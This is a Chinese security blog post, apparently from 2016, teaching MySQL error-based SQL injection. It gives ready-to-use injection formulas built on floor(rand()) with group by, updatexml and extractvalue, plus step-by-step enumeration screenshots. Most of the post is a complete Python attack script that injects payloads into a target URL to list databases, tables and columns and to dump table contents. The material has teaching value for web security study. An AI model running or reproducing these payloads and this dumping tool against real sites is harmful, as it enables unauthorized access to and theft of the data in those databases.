@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL注入之报错型注入(MySQL) - Reber's Blog</title>
+    <meta name="keywords" content="渗透测试,web安全,漏洞,python,php,linux">
+    <meta name="description" content="">
+    <meta name="author" content="reber">
+
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/pure-min.css">
+
+    <!--[if lte IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-old-ie-min.css">
+    <![endif]-->
+    <!--[if gt IE 8]><!-->
+    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-min.css">
+    <!--<![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="/css/style.css">
+
+    
+    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.ico" />
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/fonts-googleapis.css">
+
+    
+    <link rel="alternate" type="application/rss+xml" title="Reber&#39;s Blog" href="/index.xml" />
+
+    
+    <link rel="stylesheet" href="/css/monokai-sublime.css" type="text/css">
+    <script src="/js/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    <script src="/js/jquery.min.js"></script>
+
+</head>
+<body>
+
+
+
+
+<div class="reber">
+    
+<div class="head">
+    <h1 class="logo" id="logo">
+        <a href="/"><img src='/img/logo.png' width='70px'></a>
+    </h1>
+    <ul class="nav">
+        
+            
+                <li>
+                    <a href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+            
+                </li>
+        
+            
+                <li>
+                    <a href="/posts/"><i class='fa fa-list fa-fw'></i>Archive</a>
+            
+                </li>
+        
+            
+                <li>
+                    <a href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+            
+                </li>
+        
+    </ul>
+</div>
+
+
+    <div class="main">
+        <div class="left">
+            <div>
+                <h2>SQL注入之报错型注入(MySQL)</h2>
+                
+                <div class="post-meta">
+                    <div style="padding:5px 5px 2px 5px;">
+                        <i class="fa fa-calendar fa-fw"></i>
+                        <time>
+                            
+                                2016-06-22
+                            
+                        </time>
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                    
+
+                    
+
+                    
+                        
+                        
+                        
+                            <i class="fa fa-folder fa-fw"></i>
+                            
+                                <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                            
+                        
+                        
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                        
+                        
+                        
+                            <i class="fa fa-tags fa-fw"></i>
+                            
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
+                            
+                        
+                        
+                    </div>
+                </div>
+                
+            </div>
+            <div class="content">
+                
+                
+
+<h3 id="0x00-前提">0x00 前提</h3>
+
+<pre><code>一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用，
+它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解
+</code></pre>
+
+<h3 id="0x01-利用方式">0x01 利用方式</h3>
+
+<p>报错注入只要套用公式即可，如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):</p>
+
+<p>?id=2&rsquo; and (select 1 from <f>(select <u>count(*),<b>concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x</b></u> from information_schema.tables group by x )a</f>
+)--+</p>
+
+<p>?id=2&rsquo; and updatexml(1,concat(0x7e,(<f>SELECT @@version</f>),0x7e),1)--+</p>
+
+<p>?id=1&rsquo; and extractvalue(1, concat(0x7e, (<f>select @@version</f>),0x7e))--+</p>
+
+<p>第一个公式具体原理可以参考：<a href="http://wyb0.com/posts/mysql-injection-error-based-theory-count-rand-groupby?_blank">MySQL报错注入原理分析(count()、rand()、group by)</a></p>
+
+<h3 id="0x02-公式解析">0x02 公式解析</h3>
+
+<pre><code>floor()是取整数
+rand()在0和1之间产生一个随机数
+rand(0)*2将取0到2的随机数
+floor(rand()*2)有两条记录就会报错
+floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的
+count(*)是用来统计结果的，相当于刷新一次结果
+group by对数据分组时会先看看虚拟表里有没有这个值,若没有就插入,若存在则count(*)加1
+group by时floor(rand(0)*2)会被执行一次,若虚表不存在记录,插入虚表时会再执行一次
+</code></pre>
+
+<h3 id="0x03-注入步骤">0x03 注入步骤</h3>
+
+<ol>
+<li><p>猜测闭合字符
+<img src="/img/post/sqli5_get_closed_character.png" alt="得到闭合字符" />
+<img src="/img/post/sqli5_check_closed_character.png" alt="确认闭合字符" /></p></li>
+
+<li><p>猜测列数
+<img src="/img/post/sqli5_order_by.png" alt="得到列数" /></p></li>
+
+<li><p>尝试得到显示位
+<img src="/img/post/sqli5_get_display_point.png" alt="尝试得到显示位" /></p></li>
+
+<li><p>报错得到数据库个数
+<img src="/img/post/sqli5_get_db_num.png" alt="报错得到数据库个数" /></p></li>
+
+<li><p>报错得到数据库名
+<img src="/img/post/sqli5_get_db_name.png" alt="报错得到数据库名" /></p></li>
+
+<li><p>报错得到表名
+<img src="/img/post/sqli5_get_table_num.png" alt="报错得到表的个数" />
+<img src="/img/post/sqli5_get_table_name.png" alt="报错得到表名" /></p></li>
+
+<li><p>报错得到列名
+<img src="/img/post/sqli5_get_column_num.png" alt="报错得到列的个数" />
+<img src="/img/post/sqli5_get_column_name1.png" alt="报错得到列名1" />
+<img src="/img/post/sqli5_get_column_name2.png" alt="报错得到列名2" /></p></li>
+
+<li><p>得到列值
+<img src="/img/post/sqli5_get_column_value_num.png" alt="报错得到数据条数" />
+<img src="/img/post/sqli5_get_column_value.png" alt="报错得到列的值" /></p></li>
+</ol>
+
+<h3 id="0x04-附上利用代码">0x04 附上利用代码</h3>
+
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-  
+
+import re
+import urllib
+import urllib2
+import binascii
+from pyfiglet import figlet_format
+from optparse import OptionParser
+
+
+# --dbs url
+def getAllDatabases(url):
+    # print url
+    payload = &quot;' and(select 1 from(select+count(*),concat((select (select (select+concat(0x7e7e3a7e7e, count(distinct table_schema),0x7e7e3a7e7e) from information_schema.tables)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot;
+    payload = &quot;/**/&quot;.join(payload.split())
+    dbs_num_url = url + payload
+    # print dbs_num_url
+    response = urllib2.urlopen(dbs_num_url)
+    html = response.read()
+    # print html
+    # ~~:~~5~~:~~
+    dbs_num = int(re.search(r'~~:~~(\d*?)~~:~~', html).group(1))
+    print &quot;database num: %d&quot; % dbs_num
+    print &quot;database name: &quot;
+    for index in xrange(0,dbs_num):
+        payload = &quot;' and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e7e3a7e7e, table_schema, 0x7e7e3a7e7e) from information_schema.tables limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % index
+        payload = &quot;/**/&quot;.join(payload.split())
+        db_name_url = url + payload
+        response = urllib2.urlopen(db_name_url)
+        html = response.read()
+        db_name = re.search(r'~~:~~(.*?)~~:~~', html).group(1)
+        print &quot;\t%s&quot; % db_name
+
+def getCurrentDb(url):
+    # print &quot;CurrentDb is: aaaa&quot;
+    # print url
+
+    current_db_name_url = url + &quot;'+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x7e7e3a7e7e,/**/(select/**/database()),/**/0x7e7e3a7e7e)))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&quot;
+    response = urllib2.urlopen(current_db_name_url)
+    html = response.read()
+    current_db_name = re.search(r'~~:~~(.*?)~~:~~', html).group(1)
+    print &quot;Current database is: %s&quot; % current_db_name
+
+def getCurrentUser(url):
+    db_name_url = url + &quot;'+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x7e7e3a7e7e,/**/(select/**/user()),/**/0x7e7e3a7e7e)))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&quot;
+    response = urllib2.urlopen(db_name_url)
+    html = response.read()
+    user_name = re.search(r'~~:~~(.*?)~~:~~', html).group(1)
+    print &quot;Current user is: %s&quot; % user_name
+
+# --tables -D database url
+def getAllTablesByDb(url,db_name):
+    # print db_name
+    # print url
+    db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)
+    # print db_name_hex
+    tables_num_url = url + &quot;'+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(/**/select/**/concat(0x7e7e3a7e7e,/**/count(table_name),/**/0x7e7e3a7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=%s))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&quot; % db_name_hex
+    response = urllib2.urlopen(tables_num_url)
+    html = response.read()
+    # print html
+    tables_num = int(re.search(r'~~:~~(\d*?)~~:~~', html).group(1))
+    # print tables_num
+    print &quot;%s has %d table&quot; % (db_name, tables_num)
+    print &quot;table name: &quot;
+    for index in xrange(0,tables_num):
+        tables_name_url = url + &quot;'+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(/**/select/**/concat(0x7e7e3a7e7e,/**/table_name,/**/0x7e7e3a7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=%s/**/limit/**/%d,1))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&quot; % (db_name_hex, index)
+        response = urllib2.urlopen(tables_name_url)
+        html = response.read()
+        # print html
+        table_name = re.search(r'~~:~~(.*?)~~:~~',html).group(1)
+        print &quot;\t%s&quot; % table_name
+
+def getAllColumnsByTable(url,table_name,db_name):
+    db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)
+    table_name_hex = &quot;0x&quot; + binascii.b2a_hex(table_name)
+    payload = &quot;'+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,count(column_name),0x7e7e3a7e7e) from information_schema.columns where table_name=%s and table_schema=%s)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % (table_name_hex,db_name_hex)
+    # print payload
+    payload = &quot;/**/&quot;.join(payload.split())
+    column_num_url = url + payload
+    response = urllib2.urlopen(column_num_url)
+    html = response.read()
+    column_num = int(re.search(r'~~:~~(\d*?)~~:~~',html).group(1))
+    # print column_num
+    print &quot;Table %s of the %s has %d columns&quot; % (table_name,db_name,column_num)
+    print &quot;Table %s contains the column name:&quot; % table_name
+    for index in xrange(0,column_num):
+        payload = &quot;'+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,column_name,0x7e7e3a7e7e) from information_schema.columns where table_name=%s and table_schema=%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % (table_name_hex,db_name_hex,index)
+        payload = &quot;/**/&quot;.join(payload.split())
+        # print payload
+        column_value_url = url + payload
+        response = urllib2.urlopen(column_value_url)
+        html = response.read()
+        # print html
+        column_name = re.search(r'~~:~~(.*?)~~:~~',html).group(1)
+        print &quot;\t%s&quot; % column_name
+
+
+def getAllcontent(url,column_name,table_name,db_name):
+    # print url
+    # print column_name
+    # print table_name
+    # print db_name
+    column_name = column_name.split(',')
+    num_column = len(column_name) #想得到的字段的个数
+    # print column_name
+    # print num_column
+
+    payload = &quot;'+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,count(*),0x7e7e3a7e7e) from %s.%s)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % (db_name,table_name)
+    # print payload
+    payload = &quot;/**/&quot;.join(payload.split())
+    column_value_url = url + payload
+    response = urllib2.urlopen(column_value_url)
+    html = response.read()
+    # print html
+    column_value_num = int(re.search(r'~~:~~(\d*?)~~:~~',html).group(1))
+    print &quot;Table %s has %d columns&quot; % (table_name,column_value_num)
+    print &quot;Table %s column values:&quot; % table_name
+
+    title = &quot;\t&quot;
+    str_value = &quot;0x7e7e3a7e7e,&quot;
+    for x in xrange(0,num_column):
+        title += &quot;%-15s&quot; % column_name[x]
+        str_value += &quot;%s,0x20,&quot; % column_name[x]
+    str_value = &quot;,&quot;.join(str_value.split(',')[0:-2]) +&quot;,0x7e7e3a7e7e&quot;
+    # print str_value
+    
+    print title
+    for index in xrange(0,column_value_num):
+        payload = &quot;'+and(select 1 from(select count(*),concat((select (select ( select concat(%s) from %s.%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % (str_value,db_name,table_name,index)
+        # print payload
+        payload = &quot;/**/&quot;.join(payload.split())
+        value_url = url + payload
+        response = urllib2.urlopen(value_url)
+        html = response.read()
+        # print html
+        value = re.search(r'~~:~~(.*?)~~:~~',html).group(1).split()
+        # print value
+        stri = &quot;\t&quot;
+        # print len(value)
+        if len(value)==0:
+            print &quot;&quot;
+        else:
+            for x in xrange(0,num_column):
+                stri += &quot;%-15s&quot; % value[x]
+            print stri
+
+def main():
+    print figlet_format(&quot;sqli-error&quot;)
+    parser = OptionParser()
+    parser.add_option(&quot;-u&quot;,&quot;--URL&quot;,action=&quot;store&quot;,
+              type=&quot;string&quot;,dest=&quot;url&quot;,
+              help=&quot;get url&quot;)
+    parser.add_option(&quot;-D&quot;,&quot;--DB&quot;,action=&quot;store&quot;,
+              type=&quot;string&quot;,dest=&quot;db_name&quot;,
+              help=&quot;get database name&quot;)
+    parser.add_option(&quot;-T&quot;,&quot;--TBL&quot;,action=&quot;store&quot;,
+              type=&quot;string&quot;,dest=&quot;table_name&quot;,
+              help=&quot;get table name&quot;)
+    parser.add_option(&quot;-C&quot;,&quot;--COL&quot;,action=&quot;store&quot;,
+              type=&quot;string&quot;,dest=&quot;column_name&quot;,
+              help=&quot;get column name&quot;)
+
+    parser.add_option(&quot;--dbs&quot;,action=&quot;store_true&quot;,
+              dest=&quot;dbs&quot;,help=&quot;get all database name&quot;)
+    parser.add_option(&quot;--current-db&quot;,action=&quot;store_true&quot;,
+              dest=&quot;current_db&quot;,help=&quot;get current database name&quot;)
+    parser.add_option(&quot;--current-user&quot;,action=&quot;store_true&quot;,
+              dest=&quot;current_user&quot;,help=&quot;get current user name&quot;)
+    parser.add_option(&quot;--tables&quot;,action=&quot;store_true&quot;,
+              dest=&quot;tables&quot;,help=&quot;get tables from databases&quot;)
+    parser.add_option(&quot;--columns&quot;,action=&quot;store_true&quot;,
+              dest=&quot;columns&quot;,help=&quot;get columns from tables&quot;)
+    parser.add_option(&quot;--dump&quot;,action=&quot;store_true&quot;,
+              dest=&quot;dump&quot;,help=&quot;get value&quot;)
+    (options,args) = parser.parse_args()
+
+
+    if options == None or options.url == None:
+        parser.print_help()
+    elif options.dump and options.column_name and options.table_name and options.db_name:
+        getAllcontent(options.url,options.column_name,options.table_name,options.db_name)
+    elif options.table_name and options.db_name:
+        getAllColumnsByTable(options.url,options.table_name,options.db_name)
+    elif options.db_name:
+        getAllTablesByDb(options.url,options.db_name)    
+    elif options.dbs:
+        getAllDatabases(options.url)
+    elif options.current_db:
+        getCurrentDb(options.url)
+    elif options.current_user:
+        getCurrentUser(options.url)
+    elif options.url:
+        print &quot;you input: sqli-error.py -u www.xxx.com/?id=xx&quot;
+
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+
+                
+                <div style="padding:10px 1px;">
+                    <font color="FF0000">若未作声明则文章版权归本人所有，转载请注明原文链接：</font>
+                    <script>
+                        var link = decodeURI(window.location.href);
+                        var url = '<a href="' + link + '">'+link+'</a>';
+                        document.write(url);
+                    </script>
+                </div>
+
+                
+<div class="prev-next-post pure-g">
+    <div class="pure-u-12-24" style="text-align: left;">
+        
+        <nav class="prev">
+            <a href="http://wyb0.com/posts/2016/injection-of-union-select/">
+                <i class="fa fa-chevron-left"></i>&nbsp;&nbsp;&nbsp;SQL注入之联合查询(MySQL)
+            </a>
+        </nav>
+        
+    </div>
+    <div class="pure-u-12-24" style="text-align: right;">
+        
+        <nav class="next">
+            <a href="http://wyb0.com/posts/2016/injection-of-boolian-based/">
+                SQL注入之布尔型注入(MySQL)&nbsp;&nbsp;&nbsp;<i class="fa fa-chevron-right"></i>
+            </a>
+        </nav>
+        
+    </div>
+</div>
+
+            </div>
+        </div>
+        <div class="right">
+            
+
+<div style="padding-bottom:10px;">
+
+
+    <h2 class="asidetitle">Categorie<a href="/single.html" class="single">s</a></h2>
+    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/database" title="database">database(11)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/git" title="git">git(6)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/javascript" title="javascript">javascript(4)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/linux" title="linux">linux(26)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/other" title="other">other(16)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(76)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/php" title="php">php(12)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/python" title="python">python(35)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/server" title="server">server(10)</a>
+            </li>
+        
+            <li style="list-style-type:none;">
+                <i class="fa fa-folder fa-fw"></i>
+                <a href="http://wyb0.com/topics/windows" title="windows">windows(4)</a>
+            </li>
+        
+    </ul>
+
+
+</div>
+            
+
+<div style="padding-bottom:10px;">
+
+
+    <h2 class="asidetitle">Tags</h2>
+    <div class="taglist" id="tags">
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/ajax" title="ajax">ajax</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/cgi" title="cgi">cgi</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/csrf" title="csrf">csrf</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/c%e8%af%ad%e8%a8%80" title="c语言">c语言</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/dedecms" title="dedecms">dedecms</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/des" title="des">des</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/dmz" title="dmz">dmz</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/docker" title="docker">docker</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/getshell" title="getshell">getshell</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/git" title="git">git</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/https" title="https">https</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/injection" title="injection">injection</a>
+                <sup>16</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/intranet" title="intranet">intranet</a>
+                <sup>10</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/javascript" title="javascript">javascript</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/linux" title="linux">linux</a>
+                <sup>11</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/markdown" title="markdown">markdown</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/miscellanea" title="miscellanea">miscellanea</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/module" title="module">module</a>
+                <sup>14</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/mongodb" title="mongodb">mongodb</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/mysql" title="mysql">mysql</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/oracle" title="oracle">oracle</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/pentest" title="pentest">pentest</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/php" title="php">php</a>
+                <sup>12</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/plan" title="plan">plan</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/poc" title="poc">poc</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/python" title="python">python</a>
+                <sup>33</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/redis" title="redis">redis</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/server" title="server">server</a>
+                <sup>11</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/software" title="software">software</a>
+                <sup>8</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/sqlserver" title="sqlserver">sqlserver</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/ssh%e9%9a%a7%e9%81%93" title="ssh隧道">ssh隧道</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/ssrf" title="ssrf">ssrf</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/thread" title="thread">thread</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/tools" title="tools">tools</a>
+                <sup>10</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/tornado" title="tornado">tornado</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/wireless" title="wireless">wireless</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/xml" title="xml">xml</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/xss" title="xss">xss</a>
+                <sup>4</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" title="代码执行">代码执行</a>
+                <sup>5</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="信息泄露">信息泄露</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" title="反序列化">反序列化</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e5%8f%8d%e5%bc%b9shell" title="反弹shell">反弹shell</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e5%90%8e%e9%97%a8" title="后门">后门</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" title="命令执行">命令执行</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f" title="操作系统">操作系统</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="敏感信息泄露">敏感信息泄露</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" title="文件上传">文件上传</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" title="文件包含">文件包含</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e6%ad%a3%e5%88%99" title="正则">正则</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e7%88%86%e7%a0%b4" title="爆破">爆破</a>
+                <sup>5</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" title="端口转发">端口转发</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e7%bd%91%e7%bb%9c%e8%ae%be%e5%a4%87" title="网络设备">网络设备</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e8%84%91%e5%9b%be" title="脑图">脑图</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e8%99%9a%e6%8b%9f%e6%9c%ba" title="虚拟机">虚拟机</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e" title="逻辑漏洞">逻辑漏洞</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e9%87%8d%e5%ae%9a%e5%90%91" title="重定向">重定向</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e9%92%93%e9%b1%bc" title="钓鱼">钓鱼</a>
+                <sup>1</sup>
+            </p>
+        
+    </div>
+
+
+</div>
+
+            
+<div style="padding-bottom:10px;">
+    <h2 class="asidetitle">Links</h2>
+    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
+        <li style="list-style-type:none;">
+            <i class="fa fa-link fa-fw"></i><a href="http://www.test404.com/" target="_blank">Test404's Blog</a>
+        </li>
+        <li style="list-style-type:none;">
+            <i class="fa fa-link fa-fw"></i><a href="http://zksmile.me/" target="_blank">Zksmile's Blog</a>
+        </li>
+        <li style="list-style-type:none;">
+            <i class="fa fa-link fa-fw"></i><a href="https://y-hkl.github.io/" target="_blank">Y-HKL's Blog</a>
+        </li>
+        <li style="list-style-type:none;">
+            <i class="fa fa-link fa-fw"></i><a href="https://s.yl0.org/" target="_blank">sòng•sec</a>
+        </li>
+    </ul>
+</div>
+
+            
+<div style="padding-bottom:10px;">
+    <h2 class="asidetitle">Social</h2>
+    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
+        <li style="list-style-type:none;">
+            
+                <i class="fa fa-github-square fa-fw"></i><a href="https://github.com/reber0" target="_blank">GitHub</a>
+            
+        </li>
+        <li style="list-style-type:none;">
+            
+                <i class="fa fa-weibo fa-fw"></i><a href="http://weibo.com/u/5819760166" target="_blank">Weibo</a>
+            
+        </li>
+        <li style="list-style-type:none;">
+            <i class="fa fa-rss fa-fw"></i><a href="http://wyb0.com/index.xml" target="_blank">RSS</a>
+        </li>
+    </ul>
+</div>
+        </div>
+    </div>
+
+    <br>
+    
+<div class="foot">
+    <div class="copyright">
+        
+        Copyright &copy; 2015-<script>var d=new Date();document.write(d.getFullYear());</script> Reber. All Rights Reserved.
+
+        
+        <script type="text/javascript" src="//js.users.51.la/19363536.js"></script>
+        <a href="https://www.51.la/?19363536" target="_blank" title="51.La 网站流量统计系统">网站统计</a>
+        
+        <script type="text/javascript" src="//quote.51.la/q?id=19363536&mb=1"></script>
+    </div>
+    <script>$('.copyright img').remove();</script>
+</div>
+</div>
+
+    
+    <div class="goToTop">
+      <a href="#top" id="goToTop">
